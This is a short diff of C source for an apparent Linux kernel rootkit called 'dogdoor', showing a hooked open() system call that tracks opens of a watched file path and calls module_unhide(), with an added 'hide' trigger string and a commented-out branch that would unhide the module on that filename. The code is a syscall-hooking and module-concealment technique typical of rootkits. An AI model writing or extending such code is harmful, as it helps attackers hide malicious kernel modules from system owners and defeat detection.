@@ -69,13 +69,19 @@ asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t
 asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t mode)
 {
 	char fname[256] ;
+	char cmd[] = "hide";
 
 	copy_from_user(fname, filename, 256) ;
 
+	/*if (strcmp (fname, cmd) ==0) {
+		module_unhide() ;
+	}*/
+
 	if (filepath[0] != 0x0 && strcmp(filepath, fname) == 0) {
 		count++ ;
-		module_unhide() ;
+		module_unhide();
 	}
+
 	return orig_sys_open(filename, flags, mode) ;
 }
 
